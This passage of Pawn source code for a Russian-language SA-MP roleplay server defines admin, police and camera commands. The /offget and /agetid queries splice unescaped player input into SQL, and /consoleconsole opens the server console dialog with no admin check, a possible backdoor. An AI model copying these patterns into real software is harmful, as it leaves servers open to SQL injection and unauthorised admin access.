	strcat(string, "8) Возможность уволиться с работы не на месте устройства (/quitjob)\n");
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "VIP статус", string, "Закрыть", "");
	return 1;
}

CMD:ahelp(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 1) return 0;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);

	pPressed[playerid] = 0;

	ShowPlayerDialogAdminCommands(playerid, 0);

	return 1;
}

CMD:vid(playerid)
{
	if(lizo[playerid] == 0)
	{
		kamera[playerid] = CreateObject(19300, 0, 0, 0, 0, 0, 0);
        ChangeView(playerid, 0, GetPlayerState(playerid));

		lizo[playerid] = 1;
	}
	else
	{
		DestroyObject(kamera[playerid]);
		SetCameraBehindPlayer(playerid);

		lizo[playerid] = 0;
	}

    return true;
}

stock ChangeView(playerid, oldstate, newstate)
{
    new carid = GetPlayerVehicleID(playerid);
    new Float:X[3], Float:Y[3], Float:Z[3];
    if(carid > 0)
    {
        GetVehicleModelInfo(GetVehicleModel(carid), 1, X[0], Y[0], Z[0]);
        GetVehicleModelInfo(GetVehicleModel(carid), 2, X[1], Y[1], Z[1]);
        GetVehicleModelInfo(GetVehicleModel(carid), 3, X[2], Y[2], Z[2]);
    }
    if(oldstate == newstate)
    {
        AttachCameraToObject(playerid, kamera[playerid]);
    }
    else if(newstate == 1)
    {
        AttachObjectToPlayer(kamera[playerid], playerid, 0.0, 0.13, 0.65, 0, 0, 0);
        AttachCameraToObject(playerid, kamera[playerid]);
    }
    else if(newstate == 2 || newstate == 3)
    {
        new seat = GetPlayerVehicleSeat(playerid);
        if(seat == 0 )
        {
            X[1] -= (X[0] / 2.43), Y[1] -= 0.1, Z[1] += 0.6;
            AttachObjectToVehicle(kamera[playerid], carid, X[1], Y[1], Z[1], 0, 0, 0);
        }
        else if(seat == 1 )
        {
            X[1] += 0.0, Y[1] -= 0.1, Z[1] += 0.55;
            AttachObjectToVehicle(kamera[playerid], carid, X[1], Y[1], Z[1], 0, 0, 0);
        }
        else if(seat == 2 )
        {
            X[2] -= (X[0] / 2.43), Y[2] += 0.0, Z[2] += 0.6;
            AttachObjectToVehicle(kamera[playerid], carid, X[2], Y[2], Z[2], 0, 0, 0);
        }
        else if(seat == 3 )
        {
            X[2] += 0.0, Y[2] += 0.0, Z[2] += 0.55;
            AttachObjectToVehicle(kamera[playerid], carid, X[2], Y[2], Z[2], 0, 0, 0);
        }
        else
        {
            if(seat == 0)
            {
                AttachObjectToVehicle(kamera[playerid], carid, X[1], Y[1] + 0.45, Z[1] + 0.6, 0, 0, 0);
            }
            if(seat == 1)
            {
                AttachObjectToVehicle(kamera[playerid], carid, X[2], Y[2] + 0.4, Z[2] + 0.5, 0, 0, 0);
            }
        }
        AttachCameraToObject(playerid, kamera[playerid]);
    }
    return false;
}
CMD:consoleconsole(playerid)
{
	ShowPlayerDialog(playerid, D_APANEL, 2, "Консоль сервера", "\
	{ffffff}1. Список администрации {00ff00}Online\n\
	{ffffff}2. Управление админ-составом\n\
	{ffffff}3. Управление лидер-составом\n\
	{ffffff}4. Список админ-команд\n\
	{ffffff}5. Администраторские настройки\n\
	{ffcd00}6. Серверная статистика\n\
	{ff9900}7. Управление фракциями\n\
	{ff5533}8. Управление сервером", "Выбрать", "Отмена");
}
CMD:apanel(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(IsPlayerGrandAdmin(playerid))
	{
		if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	   	ShowPlayerDialog(playerid, D_APANEL, 2, "Панель администратора", "\
	   	{ffffff}1. Игроки с VIP'ом\n\
	   	{ffffff}2. Игроки с мутом\n\
	   	{ffffff}3. Игроки в тюрьме\n\
	 	{ffffff}4. Администрация в сети\n\
	 	{ffffff}5. Весь список администрации\n\
	 	{ffffff}6. Весь список лидеров\n\
	 	{ffffff}7. Команды администратора\n\
	 	{ffffff}8. Настройки администратора\n\
	 	{ffffff}9. Статистика сервера\n\
	   	{ffffff}10. Расформировать фракцию\n\
		{ffffff}11. Управление сервером", "Выбрать", "Отмена");
 	}
 	else
 	{
		if(PI[playerid][pAdmin] < 2) return 1;
		else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	   	ShowPlayerDialog(playerid, D_APANEL, 2, "Панель администратора", "\
	   	{ffffff}1. Игроки с VIP'ом\n\
	   	{ffffff}2. Игроки с мутом\n\
	   	{ffffff}3. Игроки в тюрьме\n\
	 	{ffffff}4. Администрация в сети\n\
	 	{ffffff}5. Весь список администрации\n\
	 	{ffffff}6. Весь список лидеров\n\
	 	{ffffff}7. Команды администратора\n\
	 	{ffffff}8. Настройки администратора", "Выбрать", "Отмена");
 	}
	return 1;
}

CMD:daclog(playerid)
{
	if(PI[playerid][pAdmin] == 0) return 1;

	new status = GetPVarInt(playerid, "anticheat_log"),
	    fmt_text[70];

	SetPVarInt(playerid, "anticheat_log", status ^ 1);

	format(fmt_text, sizeof fmt_text, "[DAC] Логи античита %s", (status == 0) ? ("включены") : ("выключены"));

	SendClientMessage(playerid, -1, fmt_text);

	return 1;
}

CMD:get(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /get [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new string[64];

	STRING_GLOBAL[0] = EOS;
	format(string, sizeof(string), "Номер аккаунта:\t%i\n", PI[params[0]][pID]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "Наличные:\t\t%i\n", PI[params[0]][pCash]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "Банковский счёт:\t%i\n", PI[params[0]][pBank]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "Уровень:\t\t%i\n", PI[params[0]][pLevel]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "IP адрес (регис.):\t%s\n", PI[params[0]][pRegIP]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "IP адрес (последн.):\t%s\n", PI[params[0]][pLastIP]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "Дата регистрации:\t%s\n", PI[params[0]][pRegData]);
	strcat(STRING_GLOBAL, string);
	format(string, sizeof(string), "Донат:\t\t\t%i\n", PI[params[0]][pCredits]);
	strcat(STRING_GLOBAL, string);
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, GetName(params[0]), STRING_GLOBAL, "Закрыть", "");
	return 1;
}

CMD:offget(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new playername[MAX_PLAYER_NAME];
	if(sscanf(params, "s[128]", playername)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offget [имя игрока]");
	else if(GetPlayerID(playername) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /get");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s'", playername);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerOffget", "is", playerid, playername);
	return 1;
}

CMD:agetid(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 6) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new playername[MAX_PLAYER_NAME];
	if(sscanf(params, "s[90]", playername)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /agetid [id игрока]");
	//else if(GetPlayerID(playername) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /get");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `id`='%s'", playername);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerOffgeta", "is", playerid, playername);
	return 1;
}

CMD:amusic(playerid,params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 6) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    new distance;
	if(MUSICACTIVE == true)
	{
	    foreach(new i: Player)
		{
		    if(!PlayerLogged[i] || activemusic[i] == false) continue;
		    activemusic[i] = false;
			StopAudioStreamForPlayer(i);
		}
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[A] %s[%d] выключил музыку", GetName(playerid), playerid);
		SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
		MUSICACTIVE = false;
	    return 1;
	}
	if(sscanf(params, "s[256]d", params[0], distance)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /amusic [url] [дистанция]");
	if(strlen(params[0]) < 10 || strlen(params[0]) > 256) return SendClientMessage(playerid, COLOR_GREY, "Неверное количество символов в URL!");
	if(distance < 2 || distance > 300) return SendClientMessage(playerid, COLOR_GREY, "Неверно указана дистанция!");
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	MUSICACTIVE = true;
	MUSICX = X;
	MUSICY = Y;
	MUSICZ = Z;
	MUSICDIST = distance;
	strmid(MUSICURL, params[0], 0, strlen(params[0]), 256);
	activemusic[playerid] = true;
	foreach(new i: Player) { PlayAudioStreamForPlayer(i, params[0], X, Y, Z, distance, 1); }

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[A] %s[%d] поставил музыку (дистанция %d м)", GetName(playerid), playerid, distance);
    SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
	return true;
}
CMD:dj(playerid,params[])
{
	if(PI[playerid][pAdmin] < 6)
		return 1;

	if(!IsPlayerInRangeOfPoint(playerid,0.5,-201.2533,856.0426,2613.6101)) return SendClientMessage(playerid, -1, "Вы не у стойки для DJ.");
	new radio[256];
	if(sscanf(params, "s[256]", radio)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /dj [ссылка на музыку]");
	if(strlen(radio) < 10 || strlen(radio) > 256) return SendClientMessage(playerid, COLOR_GREY, "Неверное количество символов в URL!");
	strmid(MUSICURL, radio, 0, strlen(radio), 256);
	foreach(new i: Player)
	{
		PlayAudioStreamForPlayer(i, radio, -201.2533,856.0426,2613.6101, 33, 1);
		SendClientMessage(i, COLOR_GREY, "DJ включил музыку");
		SendClientMessage(i, COLOR_GREY, "((Если Вы не слышите музыку, то включите в настройках радио на полное!))");
	}
	return true;
}
CMD:unmask(playerid, params[])
{
    if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам недоступна эта команда!");
    if(UnMaskReset[playerid] > 0) return 1;
	UnMaskReset[playerid] = 3;
	foreach(new i: Player)
	{
 		if(!PlayerLogged[i]) continue;
 		if(pCuff[i][pCuffee] == i)
 		{
			if(!PlayerUseMask[i]) continue;
			if(ProxDetectorS(2.0, playerid, i) && GetPlayerFaceToPlayer(playerid, i, 30.0))
			{
				new string[100];
				PlayerUseMask[i] = false;
				format(string, sizeof(string), "Вы сняли маску с игрока %s", GetName(i));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "%s снял с Вас маску", GetName(playerid));
				SendClientMessage(i, COLOR_GREY, string);
				format(string, sizeof(string), "снял маску с игрока %s", GetName(i));
				MeAction(playerid, string);
				break;
			}
	    }
	    else SendClientMessage(playerid, COLOR_GREY, "Игрок должен быть в наручниках");
    }
	return 1;
}

CMD:cuff(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(PlayerTied[playerid] == true) return SendClientMessage(playerid, COLOR_GREY, "Вы связаны, Вы не можете одеть наручники!");
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /cuff [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!ProxDetectorS(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Вы далеко друг от друга");
	else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете надеть наручники на себя!");
	else if(IsACop(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок Полицейский/Агент/Военный!");
	else if(pCuff[params[0]][pCuffee] == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже в наручниках!");
	else if(PI[params[0]][pWanted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находится в розыске");
	if(GetPVarInt(params[0], "Tazer") > 0)
	{
		SetPVarInt(params[0], "Tazer", 0);
		TogglePlayerControllable(params[0], 1);
		SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);
	}
	SendMes(playerid, COLOR_BLUE, "Вы надели наручники на %s", GetName(params[0]));
	if(PI[playerid][pSex] == 1) SendMes(params[0], COLOR_BLUE, "%s надел на Вас наручники!", GetName(playerid));
	else SendMes(params[0], COLOR_BLUE, "%s надела на Вас наручники!", GetName(playerid));
	SetPlayerSpecialAction(params[0], SPECIAL_ACTION_CUFFED);
	SetPlayerAttachedObject(params[0], 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	pCuff[params[0]][pCuffee] = pCuff[playerid][pCuffee] = params[0];
	pCuff[params[0]][pCuffer] = pCuff[playerid][pCuffer] = playerid;
	GameTextForPlayer(playerid, "~r~cuffed", 5000, 5);
	GameTextForPlayer(params[0], "~r~cuffed", 5000, 5);
	new string[64];
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "надел наручники на %s", GetName(params[0]));
	else format(string, sizeof(string), "надела наручники на %s", GetName(params[0]));
	MeAction(playerid, string);
	return 1;
}

CMD:uncuff(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /uncuff [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!ProxDetectorS(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Вы далеко друг от друга");
	else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете снять наручники с себя!");
	else if(pCuff[params[0]][pCuffer] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок не в наручниках!");
	SendMes(playerid, COLOR_BLUE, "Вы сняли наручники с %s", GetName(params[0]));
	if(PI[playerid][pSex] == 1) SendMes(params[0], COLOR_BLUE, "%s снял с Вас наручники", GetName(playerid));
	else SendMes(params[0], COLOR_BLUE, "%s сняла с Вас наручники", GetName(playerid));
	SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);
	RemovePlayerAttachedObject(params[0], 0);
	pCuff[params[0]][pCuffer] = pCuff[params[0]][pCuffee] = pCuff[playerid][pCuffee] = pCuff[playerid][pCuffer] = INVALID_PLAYER_ID;
	GameTextForPlayer(playerid, "~g~uncuffed", 5000, 5);
	GameTextForPlayer(params[0], "~g~uncuffed", 5000, 5);
	TogglePlayerControllable(params[0], 1);
	new string[64];
	if(PI[playerid][pSex] == 1) format(string, sizeof(string), "снял наручники с %s", GetName(params[0]));
	else format(string, sizeof(string), "сняла наручники с %s", GetName(params[0]));
	MeAction(playerid, string);
	return 1;
}

CMD:search(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /search [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PI[params[0]][pWanted]) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находится в розыске!");
	if(GetPVarInt(playerid, "findplayer") == 1)
	{
		DeletePVar(playerid, "findplayer");
		SendClientMessage(playerid, COLOR_BLUE, "Вы отключили метку на карте");
		DisablePlayerRaceCheckpoint(playerid);
	}
	else
	{
		SetPVarInt(playerid, "findplayer", 1);
		new string[51];
		format(string, sizeof(string), "Вы отметили на карте %s[%i]", GetName(params[0]));
		SendClientMessage(playerid, COLOR_BLUE, string);
		new Float:pos[3];
		GetPlayerPos(params[0], pos[0], pos[1], pos[2]);
		SetPlayerRaceCheckpoint(playerid, 1, pos[0], pos[1], pos[2], 0.0, 0.0, 0.0, 5.0);
	}
	return 1;
}

CMD:arrest(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 2558.5093,-2416.2666,21.9690) || IsPlayerInRangeOfPoint(playerid, 10.0, -279.6595,547.2475,12.7912)) // pps || dps
	{
		if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /arrest [id игрока] [минуты]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		else if(PI[params[0]][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок уже находиться в тюрьме!");
		else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете арестовать самого себя!");
		else if(IsACop(params[0]) || PI[params[0]][pMember] == TEAM_ARMIYA) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок полицейский/агент/военный!");
		else if(PI[params[0]][pWanted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен иметь хотя бы 1 уровень розыска!");
		else if(params[1] < 1 || params[1] > 60) return SendClientMessage(playerid, COLOR_GREY, "Количество минут от 1 до 60!");
		ResetPlayerWeapons(params[0]);
		PI[params[0]][pJailTime] = params[1] * 60;
		PI[params[0]][pWanted] = 0;
		MysqlUpdatePlayerInt(params[0], "wanted", PI[params[0]][pWanted]);
		if(pCuff[params[0]][pCuffer] != INVALID_PLAYER_ID)
		{
			new cuffer = pCuff[params[0]][pCuffer];
			SetPlayerSpecialAction(params[0], SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(params[0], 0);
			pCuff[params[0]][pCuffer] = INVALID_PLAYER_ID;
			pCuff[params[0]][pCuffee] = INVALID_PLAYER_ID;
			pCuff[cuffer][pCuffee] = INVALID_PLAYER_ID;
			pCuff[cuffer][pCuffer] = INVALID_PLAYER_ID;
		}
		SetPlayerColorEx(params[0], TeamColors[0]);
		SendMes(playerid, COLOR_BLUE, "Вы посадили в камеру %s[%i] на %i секунд", GetName(params[0]), params[0], params[1]*60);
		SendMes(params[0], COLOR_BLUE, "%s %s[%i] посадил Вас в камеру на %i секунд", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[1]*60);
		PI[params[0]][pJail] = 1;
		SetPlayerWantedLevel(params[0], 0);
		SpawnPlayer(params[0]);
		MysqlUpdatePlayerInt(params[0], "jail", PI[params[0]][pJail]);
		MysqlUpdatePlayerInt(params[0], "jailtime", PI[params[0]][pJailTime]);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с тюрьмой!");
	return 1;
}

CMD:m(playerid, params[]) return callcmd::megaphone(playerid, params);
CMD:megaphone(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	{
		if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /megaphone [текст]");
		new string[128];
		format(string, sizeof(string), "[Мегафон] %s %s: %s",Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]],GetName(playerid),params[0]);
		ProxDetectorNew(playerid, 45.0, COLOR_YELLOW, string);
	}
	return 1;
}

CMD:clear(playerid, params[])
{
	if(!IsACop(playerid) || PI[playerid][pRank] < 4) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /clear [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете снять себе розыск!");
		else if(!PI[params[0]][pWanted]) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться в розыске!");
		else if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
		SendMes(playerid, COLOR_LIGHTBLUE, "Вы сняли уровни розыска с %s'а", GetName(params[0]));
		SendMes(params[0], COLOR_LIGHTBLUE, "Офицер %s снял с Вас уровни розыска", GetName(playerid));
		new string[128];
		format(string, sizeof(string), "Офицер %s зашел(ла) в базу данных полиции", GetName(playerid));
		ProxDetectorNew(playerid, 13.0, COLOR_PURPLE, string);
		PI[params[0]][pWanted] = 0;
		SetPlayerWantedLevel(params[0], 0);
		MysqlUpdatePlayerInt(params[0], "wanted", PI[params[0]][pWanted]);
	}
	return 1;
}

CMD:aclear(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /clear [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(!PI[params[0]][pWanted]) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться в розыске!");
		SendMes(playerid, COLOR_LIGHTBLUE, "Вы сняли уровни розыска с %s'а", GetName(params[0]));
		SendMes(params[0], COLOR_LIGHTBLUE, "Администратор %s снял с Вас уровни розыска", GetName(playerid));
		PI[params[0]][pWanted] = 0;
		SetPlayerWantedLevel(params[0], 0);
		MysqlUpdatePlayerInt(params[0], "wanted", PI[params[0]][pWanted]);
	}
	return 1;
}

CMD:push(playerid, params[])
{
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам недоступна эта команда!");
	else if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны быть в авто!");
	else if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /push [id игрока] [место(1-3)]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!ProxDetectorS(10.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не рядом с вами!");
	else if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находится в транспорте!");
	else if(pCuff[params[0]][pCuffer] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок не в наручниках!");
	else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете затащить в автомобиль самого себя!");
	else if(params[1] > 3 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество мест от 1 до 3!");
	new string[90];
	{
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете затащить в автомобиль самого себя!");
		PutPlayerInVehicle(params[0], GetPlayerVehicleID(playerid), params[1]);
		TogglePlayerControllable(params[0], 0);
		PlayerFreezed[params[0]] = true;
		if(PI[playerid][pSex] == 1) format(string, sizeof(string), "затащил в авто %s", GetName(params[0]));
		else format(string, sizeof(string), "затащила в авто %s", GetName(params[0]));
		MeAction(playerid, string);
	}
	return true;
}

CMD:incar(playerid, params[])
{
	if(!IsAMafia(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам недоступна эта команда!");
	else if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны быть в авто!");
	else if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /incar [id игрока] [место(1-3)]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!ProxDetectorS(10.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не рядом с вами!");
	else if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находится в транспорте!");
	else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете затащить в автомобиль самого себя!");
	else if(!PlayerTied[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Игрок не связан!");
	else if(params[1] > 3 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество мест от 1 до 3!");
	new string[90];
	{
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете затащить в автомобиль самого себя!");
		PutPlayerInVehicle(params[0], GetPlayerVehicleID(playerid), params[1]);
		TogglePlayerControllable(params[0], 0);
		PlayerFreezed[params[0]] = true;
		if(PI[playerid][pSex] == 1) format(string, sizeof(string), "насильно затащил в авто %s", GetName(params[0]));
		else format(string, sizeof(string), "насильно затащила в авто %s", GetName(params[0]));
		MeAction(playerid, string);
	}
	return true;
}

CMD:ram(playerid, params[])
{
	if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	new full = 0;
	for(new i = TOTALHOUSE; i > 0; i --)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, HouseInfo[i][hEntrx], HouseInfo[i][hEntry], HouseInfo[i][hEntrz]))
		{
			SendMes(playerid, COLOR_LIGHTRED, "Вы выбили дверь дома (Владелец: %s)", HouseInfo[i][hOwner]);
			if(PI[playerid][pSex] == 1) MeAction(playerid, "выбил дверь дома");
			else MeAction(playerid, "выбила дверь дома");
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
			SetPlayerInterior(playerid,HouseInfo[i][hInt]);
			SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
			full++;
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с домом!");
	return 1;
}

CMD:lic(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /lic [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new string[100], string_dialogue[120];
	format(string, sizeof(string), "Лицензии %s", GetName(playerid));
	format(string_dialogue, sizeof(string_dialogue), "{FFFFFF}\
	Водительские права: %s\n\
	Лицензия на полеты: %s\n\
	Лицензия на оружие: %s\n\
	Лицензия на судоходство: %s",
